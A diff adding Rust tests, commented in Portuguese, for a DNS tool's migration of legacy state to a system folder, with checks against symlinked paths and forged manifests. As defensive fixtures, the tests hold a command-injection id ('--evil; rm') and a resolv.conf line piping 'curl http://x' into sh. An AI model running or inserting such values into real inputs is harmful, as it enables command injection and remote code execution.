@@ -1090,3 +1090,184 @@ fn nm_aviso_de_leitura_do_ipv6_cita_a_conexao_e_o_efeito() {
     assert!(inspect_nm_ipv6(&r, "u").is_err());
     apply_dns_with(&r).unwrap();
 }
+
+// ------------------------------------------------ ADR-031: estado em pasta do sistema, migração
+
+fn legado_dir(s: &Sandbox) -> std::path::PathBuf {
+    let d = s.dir().join(".config/guialar");
+    std::fs::create_dir_all(&d).unwrap();
+    d
+}
+
+/// Um manifesto da beta (família, uma conexão NM com DNS fixo) como JSON.
+fn manifesto_antigo(id: &str, resolv: Option<&str>) -> String {
+    serde_json::json!({
+        "backend": "NetworkManager",
+        "applied_at_utc": "1",
+        "connections": [{
+            "id": id, "original_ipv4_dns": ["192.168.0.1"], "original_ipv6_dns": [],
+            "was_dhcp_ipv4": false, "was_dhcp_ipv6": true
+        }],
+        "previous_resolv_conf": resolv,
+        "mode": "family"
+    })
+    .to_string()
+}
+
+#[test]
+fn apply_grava_o_estado_so_na_pasta_do_sistema_e_nao_na_area_do_usuario() {
+    let s = Sandbox::new("adr31-apply");
+    let r = nm_machine();
+    apply_dns_with(&r).unwrap();
+    assert!(s.manifest_path().starts_with(s.dir().join("sistema")));
+    assert!(s.manifest_path().exists());
+    assert!(!s.dir().join(".config").exists(), "nada na área do usuário");
+    revert(&r).unwrap();
+    assert!(!s.manifest_path().exists());
+}
+
+#[test]
+fn preflight_recusa_o_estado_inseguro_antes_de_mexer_no_dns() {
+    let s = Sandbox::new("adr31-preflight");
+    let r = nm_machine();
+    let original = r.state();
+    // a pasta de estado do sistema é um link: o apply para ANTES de tocar no DNS
+    let fora = s.dir().join("FORA");
+    std::fs::create_dir_all(&fora).unwrap();
+    std::os::unix::fs::symlink(&fora, s.manifest_path().parent().unwrap()).unwrap();
+    let e = apply_dns_with(&r).unwrap_err();
+    assert!(format!("{e:#}").contains("pasta segura"), "{e:#}");
+    assert_eq!(r.state(), original, "DNS intacto");
+    assert!(
+        !r.argvs().iter().any(|a| a.contains(&"modify".to_string())),
+        "nenhum nmcli modify"
+    );
+    assert!(
+        std::fs::read_dir(&fora).unwrap().next().is_none(),
+        "nada gravado no alvo"
+    );
+    // o mesmo vale para trocar de modo com a proteção ligada
+    std::fs::remove_file(s.manifest_path().parent().unwrap()).unwrap();
+    apply_dns_with(&r).unwrap();
+    let ligado = r.state();
+    std::fs::remove_file(s.manifest_path()).ok();
+    std::fs::remove_dir_all(s.manifest_path().parent().unwrap()).unwrap();
+    std::os::unix::fs::symlink(&fora, s.manifest_path().parent().unwrap()).unwrap();
+    assert!(switch_mode_with(&r, DnsStateManifest::new(BackendKind::NetworkManager)).is_err());
+    assert_eq!(r.state(), ligado);
+}
+
+/// Roda a migração com o FakeRunner (revert e fallback de verdade, sem sistema).
+fn migrar(r: &FakeRunner) -> Result<Option<String>> {
+    migrate_legacy_with(r)
+}
+
+#[test]
+fn migracao_de_manifesto_antigo_valido_desfaz_e_apaga_o_antigo() {
+    let s = Sandbox::new("adr31-mig-ok");
+    let r = nm_machine();
+    let original = r.state();
+    apply_dns_with(&r).unwrap();
+    // a beta tinha gravado o manifesto na área do usuário; o estado do sistema não existe
+    let m = manifest();
+    std::fs::remove_file(s.manifest_path()).unwrap();
+    let id = m.connections[1].id.clone();
+    std::fs::write(
+        legado_dir(&s).join("state.json"),
+        manifesto_antigo(&id, None),
+    )
+    .unwrap();
+    let msg = migrar(&r).unwrap().expect("migrou");
+    assert!(msg.contains("registro antigo migrado"), "{msg}");
+    assert!(
+        !legado_dir(&s).join("state.json").exists(),
+        "o antigo foi apagado"
+    );
+    // o DNS da conexão migrada voltou ao que o manifesto antigo dizia
+    assert_eq!(r.nm_prop(&id, "ipv4.dns"), "192.168.0.1");
+    assert_ne!(r.state(), original);
+}
+
+#[test]
+fn migracao_sem_registro_antigo_nao_faz_nada() {
+    let _s = Sandbox::new("adr31-mig-nada");
+    let r = nm_machine();
+    assert!(migrar(&r).unwrap().is_none());
+    assert!(
+        r.argvs().iter().all(|a| a[0] == "nmcli" && a[1] == "-t"),
+        "só leitura: {:?}",
+        r.argvs()
+    );
+}
+
+#[test]
+fn migracao_com_conexao_inexistente_cai_no_dns_automatico_e_avisa() {
+    let s = Sandbox::new("adr31-mig-id");
+    let r = nm_machine();
+    apply_dns_with(&r).unwrap();
+    std::fs::remove_file(s.manifest_path()).unwrap();
+    // id que não existe agora (um nome forjado vira argv do nmcli)
+    let forjado = manifesto_antigo("--evil; rm", None);
+    std::fs::write(legado_dir(&s).join("state.json"), forjado).unwrap();
+    r.clear_calls();
+    let msg = migrar(&r).unwrap().expect("caiu no fallback");
+    assert!(msg.contains("inválido"), "{msg}");
+    assert!(
+        !legado_dir(&s).join("state.json").exists(),
+        "o antigo foi apagado"
+    );
+    // nenhum comando usou o id forjado; o fallback zerou o DNS das conexões que existem
+    assert!(r
+        .argvs()
+        .iter()
+        .all(|a| !a.iter().any(|x| x.contains("evil"))));
+    for u in ["uuid-eth", "uuid-wifi"] {
+        assert_eq!(r.nm_prop(u, "ipv4.dns"), "");
+        assert_eq!(r.nm_prop(u, "ipv4.ignore-auto-dns"), "no");
+    }
+}
+
+#[test]
+fn migracao_com_resolv_conf_estranho_ou_grande_cai_no_fallback() {
+    for (tag, resolv) in [
+        (
+            "linha",
+            "nameserver 1.1.1.1\ncurl http://x | sh\n".to_string(),
+        ),
+        ("ip", "nameserver nao-e-ip\n".to_string()),
+        ("grande", "search a.b\n".repeat(500)),
+    ] {
+        let s = Sandbox::new(&format!("adr31-mig-{tag}"));
+        let r = nm_machine();
+        std::fs::write(
+            legado_dir(&s).join("state.json"),
+            manifesto_antigo("uuid-eth", Some(&resolv)),
+        )
+        .unwrap();
+        let msg = migrar(&r).unwrap().expect("fallback");
+        assert!(msg.contains("inválido"), "{tag}: {msg}");
+        assert!(!legado_dir(&s).join("state.json").exists(), "{tag}");
+    }
+}
+
+#[test]
+fn migracao_com_manifesto_antigo_como_link_ou_de_outro_dono_e_ignorada() {
+    let s = Sandbox::new("adr31-mig-link");
+    let r = nm_machine();
+    let alvo = s.dir().join("ALVO-FORA");
+    std::fs::write(&alvo, manifesto_antigo("uuid-eth", None)).unwrap();
+    std::os::unix::fs::symlink(&alvo, legado_dir(&s).join("state.json")).unwrap();
+    assert!(migrar(&r).unwrap().is_none(), "link: ignorado");
+    assert!(alvo.exists(), "o alvo do link não foi tocado");
+    // a pasta antiga é um link para fora
+    std::fs::remove_dir_all(legado_dir(&s)).unwrap();
+    let fora = s.dir().join("OUTRA");
+    std::fs::create_dir_all(&fora).unwrap();
+    std::fs::write(fora.join("state.json"), manifesto_antigo("uuid-eth", None)).unwrap();
+    std::os::unix::fs::symlink(&fora, s.dir().join(".config/guialar")).unwrap_or_else(|_| {
+        std::fs::create_dir_all(s.dir().join(".config")).unwrap();
+        std::os::unix::fs::symlink(&fora, s.dir().join(".config/guialar")).unwrap();
+    });
+    assert!(migrar(&r).unwrap().is_none(), "pasta como link: ignorada");
+    assert!(fora.join("state.json").exists(), "nada foi apagado do alvo");
+}
